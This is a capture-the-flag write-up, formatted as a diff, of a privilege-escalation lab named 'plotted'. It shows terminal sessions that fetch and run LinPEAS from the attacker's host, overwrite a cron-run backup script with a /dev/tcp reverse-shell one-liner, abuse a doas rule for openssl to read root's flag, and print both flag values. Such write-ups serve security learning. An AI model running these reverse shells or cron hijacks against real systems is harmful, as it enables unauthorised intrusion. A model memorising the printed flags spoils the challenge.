@@ -1,0 +1,280 @@
+SHELL TIME
+
+With the gained shell, I downloaded and ran the LinPEAS application to explore potential vectors for privilege escalation. In the cron table, I stumbled upon an intriguing script /var/www/scripts/backup.sh. I found out that this script could be deleted, so I removed it and created a new script with another reverse-shell. I waited for the cron to run the script as user plot_admin, allowing me to gain user-level access and the user flag.
+
+└─# nc -lvp 1234              
+listening on [any] 1234 ...
+10.10.207.225: inverse host lookup failed: Unknown host
+connect to [10.9.102.33] from (UNKNOWN) [10.10.207.225] 35944
+Linux plotted 5.4.0-89-generic #100-Ubuntu SMP Fri Sep 24 14:50:10 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
+ 17:39:05 up 45 min,  0 users,  load average: 2.58, 1.34, 0.66
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+
+$ whoami
+www-data
+
+$ ls -all
+total 4000848
+drwxr-xr-x  20 root root       4096 Oct 25  2021 .
+drwxr-xr-x  20 root root       4096 Oct 25  2021 ..
+lrwxrwxrwx   1 root root          7 Aug 24  2021 bin -> usr/bin
+drwxr-xr-x   4 root root       4096 Sep 27 17:40 boot
+drwxr-xr-x   2 root root       4096 Oct 25  2021 cdrom
+drwxr-xr-x  19 root root       3940 Sep 27 16:55 dev
+drwxr-xr-x 101 root root       4096 Sep 27 17:37 etc
+drwxr-xr-x   4 root root       4096 Oct 28  2021 home
+lrwxrwxrwx   1 root root          7 Aug 24  2021 lib -> usr/lib
+lrwxrwxrwx   1 root root          9 Aug 24  2021 lib32 -> usr/lib32
+lrwxrwxrwx   1 root root          9 Aug 24  2021 lib64 -> usr/lib64
+lrwxrwxrwx   1 root root         10 Aug 24  2021 libx32 -> usr/libx32
+drwx------   2 root root      16384 Oct 25  2021 lost+found
+drwxr-xr-x   2 root root       4096 Aug 24  2021 media
+drwxr-xr-x   2 root root       4096 Aug 24  2021 mnt
+drwxr-xr-x   2 root root       4096 Aug 24  2021 opt
+dr-xr-xr-x 176 root root          0 Sep 27 16:53 proc
+drwx------   5 root root       4096 Oct 28  2021 root
+drwxr-xr-x  28 root root        900 Sep 27 17:36 run
+lrwxrwxrwx   1 root root          8 Aug 24  2021 sbin -> usr/sbin
+drwxr-xr-x   7 root root       4096 Oct 28  2021 snap
+drwxr-xr-x   2 root root       4096 Aug 24  2021 srv
+-rw-------   1 root root 4096786432 Oct 25  2021 swap.img
+dr-xr-xr-x  13 root root          0 Sep 27 16:53 sys
+drwxrwxrwt   2 root root       4096 Sep 27 17:38 tmp
+drwxr-xr-x  15 root root       4096 Aug 24  2021 usr
+drwxr-xr-x  14 root root       4096 Oct 28  2021 var
+
+$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+www-data@plotted:/home/plot_admin$ cd /tmp
+
+www-data@plotted:/tmp$ wget 10.9.102.33:8090/linpeas.sh
+wget 10.9.102.33:8090/linpeas.sh
+--2023-09-27 17:43:09--  http://10.9.102.33:8090/linpeas.sh
+Connecting to 10.9.102.33:8090... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 848400 (829K) [text/x-sh]
+Saving to: ‘linpeas.sh’
+
+linpeas.sh          100%[===================>] 828.52K   781KB/s    in 1.1s    
+
+2023-09-27 17:43:10 (781 KB/s) - ‘linpeas.sh’ saved [848400/848400]
+
+www-data@plotted:/tmp$ chmod +x linpeas.sh
+chmod +x linpeas.sh
+www-data@plotted:/tmp$ ./linpeas.sh
+./linpeas.sh
+
+
+                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
+             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
+         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
+         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
+         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
+         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
+         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
+         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
+         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
+         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
+         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
+         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
+         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
+          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
+         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
+               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
+                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀
+
+    /---------------------------------------------------------------------------------\
+    |                             Do you like PEASS?                                  |                               
+    |---------------------------------------------------------------------------------|                               
+    |         Get the latest version    :     https://github.com/sponsors/carlospolop |                               
+    |         Follow on Twitter         :     @hacktricks_live                        |                               
+    |         Respect on HTB            :     SirBroccoli                             |                               
+    |---------------------------------------------------------------------------------|                               
+    |                                 Thank you!                                      |                               
+    \---------------------------------------------------------------------------------/                               
+          linpeas-ng by carlospolop    
+
+
+╔══════════╣ Active Ports
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                                                                                                                             
+tcp   LISTEN 0      4096        127.0.0.53%lo:53           0.0.0.0:*                                                                                                                                      
+tcp   LISTEN 0      128               0.0.0.0:22           0.0.0.0:*            
+tcp   LISTEN 0      70              127.0.0.1:33060        0.0.0.0:*            
+tcp   LISTEN 0      151             127.0.0.1:3306         0.0.0.0:*            
+tcp   LISTEN 0      511                     *:80                 *:*            
+tcp   LISTEN 0      128                  [::]:22              [::]:*            
+tcp   LISTEN 0      511                     *:445                *:*            
+
+
+
+╔══════════╣ Cron jobs
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs                                
+/usr/bin/crontab                                                                                                      
+incrontab Not Found
+-rw-r--r-- 1 root root    1091 Oct 28  2021 /etc/crontab                                                              
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+* *     * * *   plot_admin /var/www/scripts/backup.sh
+
+╔══════════╣ Searching folders owned by me containing others files on it (limit 100)
+-rwxrwxr-- 1 plot_admin plot_admin 141 Oct 28  2021 /var/www/scripts/backup.sh   
+
+www-data@plotted:/tmp$ cat /var/www/scripts/backup.sh
+cat /var/www/scripts/backup.sh
+#!/bin/bash
+
+/usr/bin/rsync -a /var/www/html/management /home/plot_admin/tms_backup
+/bin/chmod -R 770 /home/plot_admin/tms_backup/management
+
+
+www-data@plotted:/var/www/scripts$ echo "/bin/sh -i >& /dev/tcp/10.9.102.33/4547 0>&1" > backup.sh
+<h -i >& /dev/tcp/10.9.102.33/4547 0>&1" > backup.sh
+bash: backup.sh: Permission denied
+
+
+
+www-data@plotted:/var/www/scripts$ rm backup.sh
+rm backup.sh
+rm: remove write-protected regular file 'backup.sh'? y
+y
+
+www-data@plotted:/var/www/scripts$ touch backup.sh
+
+www-data@plotted:/var/www/scripts$ echo "/bin/sh -i >& /dev/tcp/10.9.102.33/4547 0>&1" > backup.sh
+
+www-data@plotted:/var/www/scripts$ cat backup.sh
+cat backup.sh
+/bin/sh -i >& /dev/tcp/10.9.102.33/4547 0>&1
+
+
+www-data@plotted:/var/www/scripts$ chmod +x backup.sh
+
+waiting for cron
+
+─# nc -lvp 4547                       
+listening on [any] 4547 ...
+10.10.207.225: inverse host lookup failed: Unknown host
+connect to [10.9.102.33] from (UNKNOWN) [10.10.207.225] 50658
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+plot_admin
+
+$ cd /home
+
+$ ls
+plot_admin
+ubuntu
+
+$ cd plot_admin
+$ ls -all
+total 32
+drwxr-xr-x  4 plot_admin plot_admin 4096 Oct 28  2021 .
+drwxr-xr-x  4 root       root       4096 Oct 28  2021 ..
+lrwxrwxrwx  1 root       root          9 Oct 28  2021 .bash_history -> /dev/null
+-rw-r--r--  1 plot_admin plot_admin  220 Oct 28  2021 .bash_logout
+-rw-r--r--  1 plot_admin plot_admin 3771 Oct 28  2021 .bashrc
+drwxrwxr-x  3 plot_admin plot_admin 4096 Oct 28  2021 .local
+-rw-r--r--  1 plot_admin plot_admin  807 Oct 28  2021 .profile
+drwxrwx--- 14 plot_admin plot_admin 4096 Oct 28  2021 tms_backup
+-rw-rw----  1 plot_admin plot_admin   33 Oct 28  2021 user.txt
+
+$ cat user.txt
+77927510d5edacea1f9e86602f1fbadb
+
+User flag 🏁: 77927510d5edacea1f9e86602f1fbadb
+PRIVESC
+
+Now having user-level access, I ran LinPEAS again and discovered that it was possible to run the doas application with root permissions and execute openssl. After some searching on GTFOBins, I figured out how to utilize openssl to read the root flag. And voilà, I successfully obtained the root flag and completed this challenge!
+
+plot_admin@plotted:~$ cd -tmp
+cd -tmp
+
+plot_admin@plotted:/tmp$ ./linpeas.sh 
+./linpeas.sh
+
+
+                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
+             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
+         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
+         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
+         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
+         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
+         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
+         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
+         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
+         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
+         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
+         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
+         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
+          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
+         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
+               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
+                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀
+
+    /---------------------------------------------------------------------------------\
+    |                             Do you like PEASS?                                  |                                                                                      
+    |---------------------------------------------------------------------------------|                                                                                      
+    |         Get the latest version    :     https://github.com/sponsors/carlospolop |                                                                                      
+    |         Follow on Twitter         :     @hacktricks_live                        |                                                                                      
+    |         Respect on HTB            :     SirBroccoli                             |                                                                                      
+    |---------------------------------------------------------------------------------|                                                                                      
+    |                                 Thank you!                                      |                                                                                      
+    \---------------------------------------------------------------------------------/                                                                                      
+          linpeas-ng by carlospolop                                                                                                                                          
+                                                                                                                                                                             
+ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.                                                                
+                                                                                                                                                                             
+Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
+ LEGEND:                                                                                                                                                                     
+  RED/YELLOW: 95% a PE vector
+  RED: You should take a look to it
+  LightCyan: Users with console
+  Blue: Users without console & mounted devs
+  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
+  LightMagenta: Your username
+
+ Starting linpeas. Caching Writable Folders...
+
+╔══════════╣ Checking doas.conf
+permit nopass plot_admin as root cmd openssl    
+
+
+plot_admin@plotted:/tmp$ cat /etc/doas.conf                                                                                                                                                 
+cat /etc/doas.conf                                                                                                                                                                          
+permit nopass plot_admin as root cmd openssl 
+
+GTFOBins -> openssl
+
+lot_admin@plotted:/tmp$ LFILE=/root/root.txt                                                                                                                                               
+LFILE=/root/root.txt                                                                                                                                                                        
+plot_admin@plotted:/tmp$ doas -u root openssl enc -in "$LFILE"                                                                                                                              
+doas -u root openssl enc -in "$LFILE"                                                                                                                                                       
+Congratulations on completing this room!                                                                                                                                                    
+                                                                                                                                                                                            
+53f85e2da3e874426fa059040a9bdcab                                                                                                                                                            
+                                                                                                                                                                                            
+Hope you enjoyed the journey!                                                                                                                                                               
+                                                                                                                                                                                            
+Do let me know if you have any ideas/suggestions for future rooms.                                                                                                                          
+-sa.infinity8888                                                           
